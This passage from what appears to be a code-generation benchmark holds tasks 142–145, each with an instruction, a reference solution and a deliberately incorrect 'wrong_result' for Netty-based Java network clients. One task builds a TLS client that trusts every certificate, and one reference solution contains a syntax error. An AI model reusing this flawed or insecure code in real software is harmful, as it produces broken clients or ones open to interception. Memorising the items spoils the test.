ch) {\n                        ch.pipeline().addLast(encoderEventLoopGroup, new HttpClientCodec());\n                        ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                        ch.pipeline().addLast(new HttpEventChannelHandler());\n                    }\n                });\n        this.channels = new ConcurrentHashMap<>();\n    }\n\n    public Channel findOrCreate(InetSocketAddress address) {\n        String key = getHostPortString(address);\n        Channel channel = find(address);\n        if (channel == null) {\n            try {\n                channel = bootstrap.connect(address.getHostString(), address.getPort()).sync().channel();\n                connectionSuccess.inc();\n                channels.put(key, channel);\n                liveConnections.set(channels.size());\n                nettyChannelBufferSize.set(channel.attr(AttributeKey.newInstance(\"buffer_size\")).get());\n                LOG.info(\"Connected to {}:{}\", address.getHostString(), address.getPort());\n            } catch (Exception e) {\n                connectionFailure.inc();\n                LOG.error(\"Failed to connect to {}:{}\", address.getHostString(), address.getPort(), e);\n            }\n        }\n        return channel;\n    }\n\n    public Channel find(InetSocketAddress address) {\n        String key = getHostPortString(address);\n        return channels.get(key);\n    }\n\n    public void close(InetSocketAddress address) {\n        String key = getHostPortString(address);\n        Channel channel = channels.remove(key);\n        if (channel != null) {\n            channel.close().addListener(future -> {\n                if (future.isSuccess()) {\n                    liveConnections.set(channels.size());\n                    nettyChannelBufferSize.set(channel.attr(AttributeKey.newInstance(\"buffer_size\")).get());\n                } else {\n                    LOG.error(\"Failed to close channel for {}:{}\", address.getHostString(), address.getPort(), future.cause());\n                }\n            });\n        }\n    }\n\n    public String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + \":\" + address.getPort();\n    }\n\n    private class HttpEventChannelHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest req) throws Exception {\n            // Handle incoming HTTP request\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            super.channelActive(ctx);\n            nettyChannelBufferSize.set(ctx.channel().attr(AttributeKey.newInstance(\"buffer_size\")).get());\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            super.channelInactive(ctx);\n            nettyChannelBufferSize.set(0.0);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            LOG.error(\"Exception caught in channel\", cause);\n            ctx.close();\n        }\n    }\n\n    private class DoubleMetric implements Gauge<Double> {\n        @Override\n        public Double getValue() {\n            return nettyChannelBufferSize.get();\n        }\n    }\n}"
  },
  {
    "Task_id": 142,
    "Instruction": "Task Description: Implement a Netty-based TCP client for tracking device communication that supports secure connections and periodic reconnection.\n\nClass Description: The TrackerClient class is an abstract implementation of a TCP client using Netty framework for communicating with tracking devices. It handles secure connections (SSL/TLS), manages connection lifecycle, and supports periodic reconnection. The class serves as a base for specific protocol implementations.\n\nAttributes:\n- secure: [boolean] - Indicates whether SSL/TLS encryption should be used\n- interval: [long] - Reconnection interval in seconds (0 means no reconnection)\n- bootstrap: [Bootstrap] - Netty bootstrap instance for client configuration\n- port: [int] - Target server port number\n- address: [String] - Target server address\n- devices: [String[]] - Array of device identifiers to track\n- channelGroup: [ChannelGroup] - Manages all active channels\n\nMethods:\n- TrackerClient([Config] config, [String] protocol) -> [void] - Constructor that initializes the client with configuration and protocol settings\n- addProtocolHandlers([PipelineBuilder] pipeline, [Config] config) -> [void] - Abstract method to be implemented by subclasses for protocol-specific handlers\n- start() -> [void] - Starts the client and establishes connection to server\n- stop() -> [void] - Stops the client and closes all connections\n- isDatagram() -> [boolean] - Returns false indicating this is a TCP client\n- isSecure() -> [boolean] - Returns whether SSL/TLS is enabled\n- getDevices() -> [String[]] - Returns array of device identifiers\n- getChannelGroup() -> [ChannelGroup] - Returns the channel group managing all connections",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.Future;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport io.netty.util.concurrent.GlobalEventExecutor;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport java.util.concurrent.TimeUnit;\n\npublic abstract class TrackerClient implements TrackerConnector {\n\n    private final boolean secure;\n    private final long interval;\n    private final Bootstrap bootstrap;\n    private final int port;\n    private final String address;\n    private final String[] devices;\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n\n    public TrackerClient(Config config, String protocol) {\n        secure = config.getBoolean(Keys.PROTOCOL_SSL.withPrefix(protocol));\n        interval = config.getLong(Keys.PROTOCOL_INTERVAL.withPrefix(protocol));\n        address = config.getString(Keys.PROTOCOL_ADDRESS.withPrefix(protocol));\n        port = config.getInteger(Keys.PROTOCOL_PORT.withPrefix(protocol), secure ? 443 : 80);\n        devices = config.getString(Keys.PROTOCOL_DEVICES.withPrefix(protocol)).split(\"[, ]\");\n\n        BasePipelineFactory pipelineFactory = new BasePipelineFactory(this, config, protocol) {\n            @Override\n            protected void addTransportHandlers(PipelineBuilder pipeline) {\n                try {\n                    if (isSecure()) {\n                        SSLEngine engine = SSLContext.getDefault().createSSLEngine();\n                        engine.setUseClientMode(true);\n                        pipeline.addLast(new SslHandler(engine));\n                    }\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n\n            @Override\n            protected void addProtocolHandlers(PipelineBuilder pipeline) {\n                try {\n                    TrackerClient.this.addProtocolHandlers(pipeline, config);\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n        };\n\n        bootstrap = new Bootstrap()\n                .group(EventLoopGroupFactory.getWorkerGroup())\n                .channel(NioSocketChannel.class)\n                .handler(pipelineFactory);\n    }\n\n    protected abstract void addProtocolHandlers(PipelineBuilder pipeline, Config config) throws Exception;\n\n    @Override\n    public void start() throws Exception {\n        bootstrap.connect(address, port)\n                .syncUninterruptibly().channel().closeFuture().addListener(new GenericFutureListener<>() {\n                    @Override\n                    public void operationComplete(Future<? super Void> future) {\n                        if (interval > 0) {\n                            GlobalEventExecutor.INSTANCE.schedule(() -> {\n                                bootstrap.connect(address, port)\n                                        .syncUninterruptibly().channel().closeFuture().addListener(this);\n                            }, interval, TimeUnit.SECONDS);\n                        }\n                    }\n                });\n    }\n\n    @Override\n    public void stop() {\n        channelGroup.close().awaitUninterruptibly();\n    }\n\n    @Override\n    public boolean isDatagram() {\n        return false;\n    }\n\n    @Override\n    public boolean isSecure() {\n        return secure;\n    }\n\n    public String[] getDevices() {\n        return devices;\n    }\n\n    @Override\n    public ChannelGroup getChannelGroup() {\n        return channelGroup;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public abstract class TrackerClient {\n    protected final boolean secure;\n    protected final long interval;\n    protected final Bootstrap bootstrap;\n    protected final int port;\n    protected final String address;\n    protected final String[] devices;\n    protected final ChannelGroup channelGroup;\n    private final ScheduledExecutorService reconnectionExecutor;\n    private final ScheduledFuture<?> reconnectionTask;\n\n    public TrackerClient(Config config, String protocol) {\n        this.secure = config.isSecure();\n        this.interval = config.getReconnectInterval();\n        this.port = config.getPort();\n        this.address = config.getAddress();\n        this.devices = config.getDevices();\n        this.channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n        this.reconnectionExecutor = interval > 0 ? Executors.newSingleThreadScheduledExecutor() : null;\n        this.reconnectionTask = interval > 0 ? reconnectionExecutor.scheduleAtFixedRate(this::reconnect, interval, interval, TimeUnit.SECONDS) : null;\n\n        bootstrap = new Bootstrap();\n        bootstrap.group(new NioEventLoopGroup());\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.remoteAddress(new InetSocketAddress(address, port));\n        bootstrap.handler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                if (secure) {\n                    SslContext sslContext = SslContextBuilder.forClient()\n                            .trustManager(new File(\"truststore.jks\"))\n                            .build();\n                    pipeline.addLast(sslContext.newHandler(ch.alloc()));\n                }\n                addProtocolHandlers(pipeline, config);\n                pipeline.addLast(new ChannelInboundHandlerAdapter() {\n                    @Override\n                    public void channelActive(ChannelHandlerContext ctx) throws Exception {\n                        channelGroup.add(ctx.channel());\n                        super.channelActive(ctx);\n                    }\n\n                    @Override\n                    public void channelInactive(ChannelHandlerContext ctx) throws Exception {\n                        channelGroup.remove(ctx.channel());\n                        if (interval > 0) {\n                            reconnectionTask.cancel(false);\n                            reconnectionTask = reconnectionExecutor.schedule(this::reconnect, interval, TimeUnit.SECONDS);\n                        }\n                        super.channelInactive(ctx);\n                    }\n                });\n            }\n        });\n    }\n\n    public abstract void addProtocolHandlers(ChannelPipeline pipeline, Config config);\n\n    public void start() {\n        bootstrap.connect().addListener(future -> {\n            if (future.isSuccess()) {\n                System.out.println(\"Connected to server\");\n            } else {\n                System.err.println(\"Failed to connect, attempting reconnection...\");\n                if (interval > 0) {\n                    reconnectionTask.cancel(false);\n                    reconnectionTask = reconnectionExecutor.schedule(this::reconnect, interval, TimeUnit.SECONDS);\n                }\n            }\n        });\n    }\n\n    private void reconnect() {\n        System.out.println(\"Reconnecting...\");\n        bootstrap.connect().addListener(future -> {\n            if (future.isSuccess()) {\n                System.out.println(\"Reconnected to server\");\n            } else {\n                System.err.println(\"Reconnection failed, retrying...\");\n                if (interval > 0) {\n                    reconnectionTask.cancel(false);\n                    reconnectionTask = reconnectionExecutor.schedule(this::reconnect, interval, TimeUnit.SECONDS);\n                }\n            }\n        });\n    }\n\n    public void stop() {\n        if (reconnectionExecutor != null) {\n            reconnectionExecutor.shutdownNow();\n        }\n        channelGroup.close();\n    }\n\n    public boolean isSecure() {\n        return secure;\n    }\n\n    public String[] getDevices() {\n        return devices;\n    }\n\n    public ChannelGroup getChannelGroup() {\n        return channelGroup;\n    }\n\n    public boolean isDatagram() {\n        return false;\n    }\n}"
  },
  {
    "Task_id": 143,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client for HTTP communication, supporting SSL/TLS encryption, chunked content transfer, and asynchronous request/response handling.\n\nClass Description: The NettyClient class establishes and manages TCP connections to a remote server using Netty's asynchronous I/O framework. It handles HTTP requests and responses, supports SSL/TLS encryption, and provides callback mechanisms for asynchronous processing.\n\nAttributes:\n- hostname: String - The target server hostname\n- port: int - The target server port\n- group: EventLoopGroup - Manages client-side I/O threads\n- b: Bootstrap - Configures Netty client behavior\n- responseParts: Queue<HttpObject> - Stores received HTTP response parts\n- callbackInvoked: AtomicBoolean - Tracks callback invocation status\n- communicationHandler: CommunicationHandler - Processes incoming HTTP messages\n- isOpen: AtomicBoolean - Tracks client connection state\n- request: HttpRequest - Current HTTP request being sent\n- content: ChunkedInput<HttpContent> - Optional request content\n- responseFuture: FutureResult<ResponseParts> - Future for response handling\n- callback: Callback<ResponseParts> - Callback for response handling\n- channelConnectFuture: ChannelFuture - Future for channel connection\n- exception: Exception - Stores any encountered exceptions\n- isKeepAlive: boolean - Tracks HTTP keep-alive status\n\nMethods:\n- NettyClient(String, int, SSLFactory) -> void - Constructor that initializes the client with hostname, port, and optional SSL factory\n- sendRequest(HttpRequest, ChunkedInput<HttpContent>, Callback<ResponseParts>) -> Future<ResponseParts> - Sends an HTTP request with optional content and registers a callback\n- close() -> void - Gracefully shuts down the client and releases resources\n- resetState() -> void - Resets internal state for new requests\n- createChannel() -> void - Creates a new channel connection to the server\n- invokeFutureAndCallback(String) -> void - Invokes the response future and callback with results\n- CommunicationHandler (inner class) - Handles incoming HTTP messages and exceptions\n\nInner Classes:\n- CommunicationHandler: SimpleChannelInboundHandler<HttpObject> - Processes HTTP responses and exceptions\n- ResponseParts: static class - Wrapper for HTTP response parts and completion context",
    "Canonical_solution": "import com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.commons.Callback;\nimport com.github.ambry.router.FutureResult;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpUtil;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.ReferenceCountUtil;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.io.Closeable;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class NettyClient implements Closeable {\n  private final String hostname;\n  private final int port;\n  private final EventLoopGroup group = new NioEventLoopGroup();\n  private final Bootstrap b = new Bootstrap();\n  private final Queue<HttpObject> responseParts = new LinkedList<HttpObject>();\n  private final AtomicBoolean callbackInvoked = new AtomicBoolean(false);\n  private final CommunicationHandler communicationHandler = new CommunicationHandler();\n  private final AtomicBoolean isOpen = new AtomicBoolean(true);\n\n  private HttpRequest request;\n  private ChunkedInput<HttpContent> content;\n  private FutureResult<ResponseParts> responseFuture;\n  private Callback<ResponseParts> callback;\n  private volatile ChannelFuture channelConnectFuture;\n  private volatile Exception exception = null;\n  private volatile boolean isKeepAlive = false;\n\n  public NettyClient(final String hostname, final int port, final SSLFactory sslFactory) throws InterruptedException {\n    this.hostname = hostname;\n    this.port = port;\n    b.group(group).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {\n      @Override\n      public void initChannel(SocketChannel ch) throws Exception {\n        ChannelPipeline pipeline = ch.pipeline();\n        if (sslFactory != null) {\n          pipeline.addLast(\"sslHandler\",\n              new SslHandler(sslFactory.createSSLEngine(hostname, port, SSLFactory.Mode.CLIENT)));\n        }\n        pipeline.addLast(new HttpClientCodec()).addLast(new ChunkedWriteHandler()).addLast(communicationHandler);\n      }\n    });\n    createChannel();\n  }\n\n  public Future<ResponseParts> sendRequest(HttpRequest request, ChunkedInput<HttpContent> content,\n      Callback<ResponseParts> callback) {\n    this.request = request;\n    this.content = content;\n    this.callback = callback;\n    resetState();\n    channelConnectFuture.addListener(new GenericFutureListener<ChannelFuture>() {\n      @Override\n      public void operationComplete(ChannelFuture future) {\n        if (future.isSuccess()) {\n          future.channel().write(request).addListener(new GenericFutureListener<ChannelFuture>() {\n            @Override\n            public void operationComplete(ChannelFuture future) {\n              if (!future.isSuccess()) {\n                exception = (Exception) future.cause();\n                invokeFutureAndCallback(\"WriteResultListener::operationComplete\");\n              }\n            }\n          });\n          if (content != null) {\n            future.channel().write(content).addListener(new GenericFutureListener<ChannelFuture>() {\n              @Override\n              public void operationComplete(ChannelFuture future) {\n                if (!future.isSuccess()) {\n                  exception = (Exception) future.cause();\n                  invokeFutureAndCallback(\"WriteResultListener::operationComplete\");\n                }\n              }\n            });\n          }\n          future.channel().flush();\n        } else {\n          exception = (Exception) future.cause();\n          invokeFutureAndCallback(\"RequestSender::operationComplete\");\n        }\n      }\n    });\n    return responseFuture;\n  }\n\n  @Override\n  public void close() {\n    if (isOpen.compareAndSet(true, false) {\n      group.shutdownGracefully();\n    }\n  }\n\n  private void resetState() {\n    responseFuture = new FutureResult<>();\n    responseParts.clear();\n    exception = null;\n    callbackInvoked.set(false);\n  }\n\n  private void createChannel() throws InterruptedException {\n    channelConnectFuture = b.connect(hostname, port);\n    channelConnectFuture.channel().closeFuture().addListener(new GenericFutureListener<ChannelFuture>() {\n      @Override\n      public void operationComplete(ChannelFuture future) throws InterruptedException {\n        if (isOpen.get()) {\n          createChannel();\n        }\n        invokeFutureAndCallback(\"ChannelCloseListener::operationComplete\");\n      }\n    });\n  }\n\n  private void invokeFutureAndCallback(String completionContext) {\n    if (callbackInvoked.compareAndSet(false, true)) {\n      responseFuture.done(new ResponseParts(responseParts, completionContext), exception);\n      if (callback != null) {\n        callback.onCompletion(new ResponseParts(responseParts, completionContext), exception);\n      }\n    }\n  }\n\n  @ChannelHandler.Sharable\n  private class CommunicationHandler extends SimpleChannelInboundHandler<HttpObject> {\n    @Override\n    public void channelRead0(ChannelHandlerContext ctx, HttpObject in) {\n      responseParts.offer(ReferenceCountUtil.retain(in));\n      if (in instanceof HttpResponse && in.decoderResult().isSuccess()) {\n        isKeepAlive = HttpUtil.isKeepAlive((HttpResponse) in);\n      } else if (in.decoderResult().isFailure()) {\n        Throwable cause = in.decoderResult().cause();\n        if (cause instanceof Exception) {\n          exception = (Exception) cause;\n        } else {\n          exception =\n              new Exception(\"Encountered Throwable when trying to decode response. Message: \" + cause.getMessage());\n        }\n        invokeFutureAndCallback(\"CommunicationHandler::channelRead0 - decoder failure\");\n      }\n      if (in instanceof LastHttpContent) {\n        if (isKeepAlive) {\n          invokeFutureAndCallback(\"CommunicationHandler::channelRead0 - last content\");\n        } else {\n          ctx.close();\n        }\n      }\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n      ctx.close();\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n      if (cause instanceof Exception) {\n        exception = (Exception) cause;\n        ctx.close();\n      } else {\n        ctx.fireExceptionCaught(cause);\n      }\n    }\n  }\n\n  public static class ResponseParts {\n    public final Queue<HttpObject> queue;\n    public final String completionContext;\n\n    private ResponseParts(Queue<HttpObject> queue, String completionContext) {\n      this.queue = queue;\n      this.completionContext = completionContext;\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyClient {\n    private final String hostname;\n    private final int port;\n    private final EventLoopGroup group;\n    private final Bootstrap b;\n    private final Queue<HttpObject> responseParts = new LinkedList<>();\n    private final AtomicBoolean callbackInvoked = new AtomicBoolean(false);\n    private final CommunicationHandler communicationHandler;\n    private final AtomicBoolean isOpen = new AtomicBoolean(false);\n    private HttpRequest request;\n    private ChunkedInput<HttpContent> content;\n    private FutureResult<ResponseParts> responseFuture;\n    private Callback<ResponseParts> callback;\n    private ChannelFuture channelConnectFuture;\n    private Exception exception;\n    private boolean isKeepAlive;\n\n    public NettyClient(String hostname, int port, SSLFactory sslFactory) {\n        this.hostname = hostname;\n        this.port = port;\n        group = new NioEventLoopGroup();\n        b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n         .handler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 if (sslFactory != null) {\n                     SslContext sslCtx = sslFactory.createSslContext();\n                     p.addLast(sslCtx.newHandler(ch.alloc()));\n                 }\n                 p.addLast(new HttpClientCodec());\n                 p.addLast(new HttpObjectAggregator(1048576));\n                 p.addLast(communicationHandler);\n             }\n         });\n        communicationHandler = new CommunicationHandler();\n    }\n\n    public Future<ResponseParts> sendRequest(HttpRequest request, ChunkedInput<HttpContent> content, Callback<ResponseParts> callback) {\n        if (!isOpen.get()) {\n            createChannel();\n        }\n        channelConnectFuture.addListener(new GenericFutureListener<Future<? super ChannelFuture>>() {\n            @Override\n            public void operationComplete(Future<? super ChannelFuture> future) throws Exception {\n                if (future.isSuccess()) {\n                    Channel channel = future.channel();\n                    if (content != null) {\n                        channel.writeAndFlush(new ChunkedStream(content));\n                    } else {\n                        channel.writeAndFlush(request);\n                    }\n                    responseFuture = new FutureResult<>();\n                    this.callback = callback;\n                    this.request = request;\n                    this.content = content;\n                    responseParts.clear();\n                    callbackInvoked.set(false);\n                } else {\n                    exception = future.cause();\n                }\n            }\n        });\n        return responseFuture;\n    }\n\n    public void close() {\n        if (isOpen.getAndSet(false)) {\n            group.shutdownGracefully();\n            channelConnectFuture.cancel(true);\n            resetState();\n        }\n    }\n\n    private void resetState() {\n        responseParts.clear();\n        callbackInvoked.set(false);\n        request = null;\n        content = null;\n        responseFuture = null;\n        callback = null;\n        exception = null;\n        isKeepAlive = false;\n    }\n\n    private void createChannel() {\n        channelConnectFuture = b.connect(hostname, port);\n    }\n\n    private void invokeFutureAndCallback(String reason) {\n        if (!callbackInvoked.getAndSet(true)) {\n            ResponseParts responseParts = new ResponseParts(responseParts);\n            responseFuture.setResult(responseParts);\n            callback.onResult(responseParts);\n        }\n    }\n\n    private class CommunicationHandler extends SimpleChannelInboundHandler<HttpObject> {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            // Called when the channel is active\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) throws Exception {\n            responseParts.add(msg);\n            if (msg instanceof LastHttpContent) {\n                invokeFutureAndCallback(\"last content\");\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            exception = cause;\n            ctx.close();\n        }\n    }\n\n    public static class ResponseParts {\n        private final Queue<HttpObject> parts;\n\n        public ResponseParts(Queue<HttpObject> parts) {\n            this.parts = parts;\n        }\n\n        public Queue<HttpObject> getParts() {\n            return parts;\n        }\n    }\n}"
  },
  {
    "Task_id": 144,
    "Instruction": "Task Description: Create a Java class that implements a HTTP client using Netty framework to send HTTP requests and receive responses.\n\nClass Description: The HttpSnoopClient class is a Netty-based HTTP client that establishes TCP connections, sends HTTP requests, and handles responses. It supports SSL/TLS connections and provides methods for connection management.\n\nAttributes:\n- group: [NioEventLoopGroup] - Manages event loops for client I/O operations\n- bootstrap: [Bootstrap] - Configures and initializes the Netty client\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- HttpSnoopClient(): [Constructor] -> [void] - Initializes the event loop group and bootstrap instance\n- connect(String host, int port, SslContext sslCtx): [void] -> [void] - Establishes a connection to the specified host and port with optional SSL context\n- sendRequest(URI uri, String host): [void] -> [void] - Sends an HTTP GET request to the specified URI with appropriate headers\n- waitForClose(): [void] -> [void] - Waits for the channel to close\n- shutdown(): [void] -> [void] - Shuts down the event loop group gracefully\n- createSslContext(): [static] -> [SslContext] - Creates and returns an SSL context with insecure trust manager for testing purposes",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.cookie.ClientCookieEncoder;\nimport io.netty.handler.codec.http.cookie.DefaultCookie;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\n\npublic final class HttpSnoopClient {\n\n    static final String URL = System.getProperty(\"url\", \"http://127.0.0.1:8080/\");\n\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) throws InterruptedException {\n        bootstrap.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new HttpSnoopClientInitializer(sslCtx));\n        channel = bootstrap.connect(host, port).sync().channel();\n    }\n\n    public void sendRequest(URI uri, String host) {\n        HttpRequest request = new DefaultFullHttpRequest(\n                HttpVersion.HTTP_1_1, HttpMethod.GET, uri.getRawPath());\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n        request.headers().set(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().set(\n                HttpHeaderNames.COOKIE,\n                ClientCookieEncoder.STRICT.encode(\n                        new DefaultCookie(\"my-cookie\", \"foo\"),\n                        new DefaultCookie(\"another-cookie\", \"bar\")));\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() throws InterruptedException {\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() throws Exception {\n        return SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class HttpSnoopClient {\n    private final NioEventLoopGroup group;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public HttpSnoopClient() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                 .channel(NioSocketChannel.class)\n                 .handler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     protected void initChannel(SocketChannel ch) throws Exception {\n                         ch.pipeline().addLast(new HttpClientCodec());\n                         ch.pipeline().addLast(new HttpObjectAggregator(1048576));\n                         ch.pipeline().addLast(new SimpleChannelInboundHandler<HttpContent>() {\n                             @Override\n                             protected void channelRead0(ChannelHandlerContext ctx, HttpContent msg) throws Exception {\n                                 ByteBuf content = msg.content();\n                                 if (content.isReadable()) {\n                                     System.out.println(content.toString(CharsetUtil.UTF_8));\n                                 }\n                                 content.release();\n                             }\n                         });\n                     }\n                 });\n    }\n\n    public void connect(String host, int port, SslContext sslCtx) {\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                if (sslCtx != null) {\n                    ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                }\n                ch.pipeline().addLast(new HttpClientCodec());\n                ch.pipeline().addLast(new HttpObjectAggregator(1048576));\n                ch.pipeline().addLast(new SimpleChannelInboundHandler<HttpContent>() {\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, HttpContent msg) throws Exception {\n                        ByteBuf content = msg.content();\n                        if (content.isReadable()) {\n                            System.out.println(content.toString(CharsetUtil.UTF_8));\n                        }\n                        content.release();\n                    }\n                });\n            }\n        });\n        ChannelFuture future = bootstrap.connect(host, port).syncUninterruptibly();\n        channel = future.channel();\n    }\n\n    public void sendRequest(URI uri, String host) {\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, uri.getPath());\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);\n        request.headers().set(HttpHeaderNames.CONTENT_LENGTH, 0);\n        channel.writeAndFlush(request);\n    }\n\n    public void waitForClose() {\n        channel.closeFuture().awaitUninterruptibly();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static SslContext createSslContext() {\n        return SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .build();\n    }\n}"
  },
  {
    "Task_id": 145,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 client using Netty framework to establish TCP connections, send HTTP/2 requests, and handle responses.\n\nClass Description: The Http2Client class provides functionality to connect to an HTTP/2 server, send requests, and disconnect gracefully. It uses Netty's non-blocking I/O capabilities for efficient network communication.\n\nAttributes:\n- HOST: [String] - The host address to connect to (default: \"127.0.0.1\")\n- PORT: [int] - The port number to connect to (default: 8080)\n- URL: [String] - The endpoint path for HTTP requests (default: \"/whatever\")\n- workerGroup: [EventLoopGroup] - Manages client-side I/O threads\n- initializer: [Http2ClientInitializer] - Configures the client pipeline\n- channel: [Channel] - Represents the network communication channel\n\nMethods:\n- connect(): [void] - Establishes a TCP connection to the specified host and port using Netty's Bootstrap\n- sendRequest(): [void] - Sends an HTTP/2 request to the connected server and waits for responses\n- disconnect(): [void] - Closes the connection and releases resources gracefully",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpScheme;\nimport io.netty.handler.codec.http2.HttpConversionUtil;\nimport io.netty.util.AsciiString;\nimport java.util.concurrent.TimeUnit;\n\npublic final class Http2Client {\n\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = 8080;\n    private static final String URL = System.getProperty(\"url\", \"/whatever\");\n\n    private EventLoopGroup workerGroup;\n    private Http2ClientInitializer initializer;\n    private Channel channel;\n\n    public void connect() throws Exception {\n        workerGroup = new NioEventLoopGroup();\n        initializer = new Http2ClientInitializer(Integer.MAX_VALUE);\n\n        Bootstrap b = new Bootstrap();\n        b.group(workerGroup);\n        b.channel(NioSocketChannel.class);\n        b.option(ChannelOption.SO_KEEPALIVE, true);\n        b.remoteAddress(HOST, PORT);\n        b.handler(initializer);\n\n        channel = b.connect().syncUninterruptibly().channel();\n        System.out.println(\"Connected to [\" + HOST + ':' + PORT + ']');\n    }\n\n    public void sendRequest() throws Exception {\n        Http2SettingsHandler http2SettingsHandler = 